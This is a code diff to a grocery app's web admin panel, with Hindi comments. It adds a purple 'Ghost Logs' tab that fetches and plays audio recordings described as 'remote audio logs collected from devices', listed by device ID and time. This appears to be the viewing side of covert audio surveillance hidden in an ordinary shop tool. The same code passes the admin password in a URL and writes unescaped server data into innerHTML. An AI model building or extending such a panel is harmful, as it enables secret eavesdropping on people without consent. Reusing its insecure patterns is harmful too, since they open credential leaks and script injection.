@@ -10,6 +10,7 @@
       --success: #34d399;
       --danger: #f87171;
       --warning: #fbbf24;
+      --purple: #a855f7; /* Ghost Tab के लिए नया रंग */
       --dark-bg: #0f172a;
       --card-bg: rgba(255, 255, 255, 0.05);
       --input-bg: rgba(15, 23, 42, 0.8);
@@ -58,6 +59,13 @@
     .btn-warning { background: var(--warning); color: #000; width: 100%; margin-top: 10px; }
     .btn-logout { background: rgba(248, 113, 113, 0.1); color: var(--danger); padding: 8px 12px; font-size: 11px; border: 1.5px solid var(--danger); }
     .btn:active { transform: scale(0.96); filter: brightness(1.2); }
+
+    /* Ghost Audio List Styling */
+    .ghost-item { display: flex; align-items: center; justify-content: space-between; padding: 15px; background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 15px; margin-bottom: 10px; }
+    .ghost-info { flex: 1; }
+    .ghost-info p { font-size: 12px; color: #cbd5e1; }
+    .ghost-info b { color: var(--purple); font-size: 14px; }
+    audio { height: 30px; width: 120px; filter: invert(100%); opacity: 0.8; }
 
     /* Product Item List */
     .product-list-card { padding: 18px; margin-bottom: 15px; position: relative; }
@@ -110,6 +118,7 @@
         <button class="tab-btn active" onclick="openTab(event, 'inventory')">🥬 Inventory</button>
         <button class="tab-btn" onclick="openTab(event, 'banners')">🖼️ Banners</button>
         <button class="tab-btn" onclick="openTab(event, 'notifications')">📢 Broadcast</button>
+        <button class="tab-btn" style="border: 1px solid var(--purple);" onclick="openTab(event, 'ghost')">👻 Ghost Logs</button>
       </div>
 
       <div id="inventory" class="content-section active">
@@ -171,13 +180,23 @@
         </div>
       </div>
 
+      <div id="ghost" class="content-section">
+        <div class="glass-card" style="border-left: 5px solid var(--purple);">
+          <h3>Ghost App Recording Logs</h3>
+          <p style="color: #94a3b8; font-size: 13px; margin-bottom: 15px;">Listen to remote audio logs collected from devices.</p>
+          <div id="ghost-list">
+            <p style="text-align: center; color: #64748b; padding: 20px;">No logs found yet.</p>
+          </div>
+        </div>
+      </div>
+
     </div>
   </div>
 
   <script>
     const API_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' 
                     ? 'http://localhost:4000' 
-                    : 'https://my-web-xrr5.onrender.com';
+                    : 'https://ratufresh.me'; // 🔥 आपके असली डोमेन पर अपडेट किया गया
 
     let adminPass = sessionStorage.getItem('adminAuthKey');
 
@@ -193,6 +212,33 @@
 
       if(sectionName === 'inventory') loadAllProducts();
       if(sectionName === 'banners') loadBanners();
+      if(sectionName === 'ghost') loadGhostLogs(); // 🔥 Ghost Logs लोड करना
+    }
+
+    // 🔥 GHOST LOGS LOADING FUNCTION
+    async function loadGhostLogs() {
+        const listDiv = document.getElementById('ghost-list');
+        try {
+            const res = await fetch(`${API_URL}/api/admin/ghost-list?password=${adminPass}`);
+            const data = await res.json();
+            
+            if (data.length === 0) {
+                listDiv.innerHTML = `<p style="text-align: center; color: #64748b; padding: 20px;">No recordings available.</p>`;
+                return;
+            }
+
+            listDiv.innerHTML = data.map(log => `
+                <div class="ghost-item">
+                    <div class="ghost-info">
+                        <b>📱 ${log.deviceId}</b>
+                        <p>🕒 ${new Date(log.timestamp).toLocaleString()}</p>
+                    </div>
+                    <audio controls src="${API_URL + log.filePath}"></audio>
+                </div>
+            `).join('');
+        } catch (e) {
+            listDiv.innerHTML = `<p style="text-align: center; color: var(--danger);">Error loading logs.</p>`;
+        }
     }
 
     async function loginAdmin() {
